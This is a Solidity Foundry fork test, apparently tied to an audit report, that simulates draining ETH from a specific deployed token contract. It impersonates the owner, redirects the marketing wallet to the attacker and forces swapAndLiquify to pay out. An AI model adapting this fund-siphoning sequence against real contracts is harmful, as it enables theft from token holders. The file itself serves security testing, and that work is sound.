pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface EloInu_AuditReport_InterFi {
    function owner() external view returns (address);
    function setMarketingWallet(address) external;
    function setNumTokensToAddLiquidity(uint256) external;
    function setSwapAndLiquifyEnabled(bool) external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function _maxTxAmount() external view returns (uint256);
    receive() external payable;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x35207068e057a01861A654463c01B04cc111E760;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for fork test
        // The test file already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Store initial balance
        uint256 initialBalance = address(this).balance;

        // Get the owner address
        EloInu_AuditReport_InterFi target = EloInu_AuditReport_InterFi(payable(TARGET));
        address owner = target.owner();

        // Impersonate owner
        vm.startPrank(owner);

        // 1. Set marketing wallet to attacker
        target.setMarketingWallet(address(this));

        // 2. Check current contract token balance
        uint256 contractTokenBalance = target.balanceOf(TARGET);

        // 3. If contract has tokens, set threshold to current balance
        // This ensures swapAndLiquify will process all accumulated tokens
        if (contractTokenBalance > 0) {
            target.setNumTokensToAddLiquidity(contractTokenBalance);
        }

        // 4. Ensure swapAndLiquify is enabled
        target.setSwapAndLiquifyEnabled(true);

        // 5. If contract doesn't have enough tokens, we need to accumulate some
        if (contractTokenBalance == 0) {
            // First, give some tokens to a dummy address that will pay fees
            address feePayer = address(0x123);

            // Get some tokens to the feePayer
            // We need to transfer from owner to feePayer first (no fees since owner is excluded)
            uint256 ownerBalance = target.balanceOf(owner);
            uint256 transferAmount = ownerBalance / 100; // 1% of owner's balance

            // Make sure it's within maxTxAmount
            uint256 maxTx = target._maxTxAmount();
            if (transferAmount > maxTx) {
                transferAmount = maxTx;
            }

            // Transfer from owner to feePayer (no fees since owner is excluded)
            target.transfer(feePayer, transferAmount);

            // Now include feePayer in fees (or just transfer from feePayer which pays fees)
            // Actually, feePayer is not excluded from fees by default, so transfers from feePayer will pay fees
            // We need to switch prank to feePayer
            vm.stopPrank();

            // Give feePayer some gas
            deal(feePayer, 1 ether);

            // Transfer from feePayer to another address (this will pay fees to contract)
            vm.startPrank(feePayer);
            target.transfer(address(0x456), transferAmount / 2);

            // Switch back to owner
            vm.stopPrank();
            vm.startPrank(owner);

            // Check new contract balance
            contractTokenBalance = target.balanceOf(TARGET);

            // Set threshold to new balance
            target.setNumTokensToAddLiquidity(contractTokenBalance);
        }

        // 6. Now trigger swapAndLiquify
        // We need to make a transfer that's not from the pair
        // Use a dummy address to make a small transfer
        address trigger = address(0x789);

        // Give trigger some tokens (transfer from owner, no fees)
        uint256 smallAmount = 1000;
        target.transfer(trigger, smallAmount);

        // Switch to trigger and make a transfer (this will pay fees and potentially trigger swap)
        vm.stopPrank();
        deal(trigger, 1 ether);
        vm.startPrank(trigger);
        target.transfer(address(0x999), smallAmount / 2);

        vm.stopPrank();

        // Check if we received ETH
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "ETH balance should increase");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

